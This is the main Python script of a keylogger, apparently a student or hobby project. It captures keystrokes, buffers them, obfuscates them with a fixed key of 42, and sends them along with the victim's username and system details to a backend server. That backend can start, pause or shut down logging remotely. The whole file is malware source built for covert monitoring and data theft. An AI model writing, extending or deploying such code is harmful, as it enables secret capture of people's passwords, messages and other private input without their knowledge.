import time                         # for sleeping and timestamps
import socket
import sys                          # for sys.exit()
from logger import KeyLoggerService # service to capture keystrokes
from writer import FileWriter       # writes data to a local file
from sender import NetworkWriter    # sends data to backend
from encryption import Encryptor    # handles encryption
import base64                       # for encoding encrypted bytes to base64
from systeminfo import get_system_info    # fetch system info like username
from backend_notifier import BackendNotifier  # talks to backend for control
from helper import *


def main():
    backendurl = "http://127.0.0.1:5000"                # backend server address
    service = KeyLoggerService()                        # start/stop logging service
    writer = FileWriter(filename="keystrokes.txt")      # write keystrokes locally
    sender = NetworkWriter(server_url=backendurl)       # send encoded data to backend
    encryption_key = 42                                 # simple encryption key
    encryptor = Encryptor(key=encryption_key)           # encryption service
    Systeminfo = get_system_info()                      # gather system info (username, etc.)
    backend_notifier = BackendNotifier(backendurl)      # backend controller

    buffer = {}                                         # holds unsent keystrokes
    backend_notifier.im_alive()                         # notify backend script is alive

    try:
        while True:
            if backend_notifier.disabled():             # check if script must shut down
                service.stop_logging()                  # stop logging immediately
                if buffer:                              # if keystrokes are pending
                    send_buffer(buffer, encryptor, writer, sender, Systeminfo, encryption_key)
                    buffer = {}                         # clear after sending
                sys.exit()                              # exit the script

            status = backend_notifier.start_or_stop()   # backend decides start or stop
            if status:
                print("im running")                     # debug message
                service.start_logging()                 # begin capturing keys
                time.sleep(10)                          # wait 10 seconds before next check
                keys = service.get_logged_keys()        # fetch newly captured keys
                if keys:
                    buffer = merge(buffer, keys)
                    print(buffer)# add them into buffer
            else:
                print("im stopping")                    # debug message
                service.stop_logging()                  # pause logging
                if buffer:                              # if any keystrokes were stored
                    send_buffer(buffer, encryptor, writer, sender, Systeminfo, encryption_key)
                    buffer = {}                         # clear buffer after sending
            time.sleep(10)                              # wait before checking again

    except KeyboardInterrupt:                           # if user presses CTRL+C
        if buffer:                                      # flush buffer before exit
            send_buffer(buffer, encryptor, writer, sender, Systeminfo, encryption_key)


if __name__ == "__main__":
    main()                                                              # run script
